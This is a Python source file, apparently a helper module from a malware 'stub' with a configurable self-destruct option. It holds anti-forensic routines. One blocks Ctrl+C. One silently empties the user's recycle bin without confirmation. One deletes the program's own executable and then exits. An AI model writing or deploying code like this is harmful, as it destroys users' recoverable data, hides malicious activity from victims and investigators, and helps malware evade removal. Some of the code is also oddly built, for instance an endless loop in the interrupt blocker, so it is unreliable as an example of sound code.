import os
import sys
import signal
import winshell
from stub.types import stub_config
from typing_extensions import assert_never
from typing import NoReturn, Callable, Any, Tuple

__all__ = ["prevent_interrupt", "clear_recycle", "self_destruct"]


def prevent_interrupt() -> None:
    """
    Prevents Ctrl+C from interrupting the program.
    """
    while __name__ == "__main__":
        signal.signal(signal.SIGINT, lambda _, __: None)


def clear_recycle() -> None:
    """
    Empty recycle bin.
    """
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass


def self_destruct() -> NoReturn | None:
    """
    Self-destructs the program.
    """
    if not stub_config.self_destruct:
        return

    funcs: Tuple[Callable[[], Any], ...] = (
        lambda: os.remove(__file__),
        lambda: os.remove(sys.argv[0]),
        lambda: os.remove(os.path.abspath(sys.argv[0])),
        lambda: os._exit(1),
        lambda: os._exit(0),
        lambda: os._exit(-1),
    )
    for f in funcs:
        try:
            f()
        except:
            continue

    raise assert_never(KeyboardInterrupt("unreachable"))  # type: ignore
    return
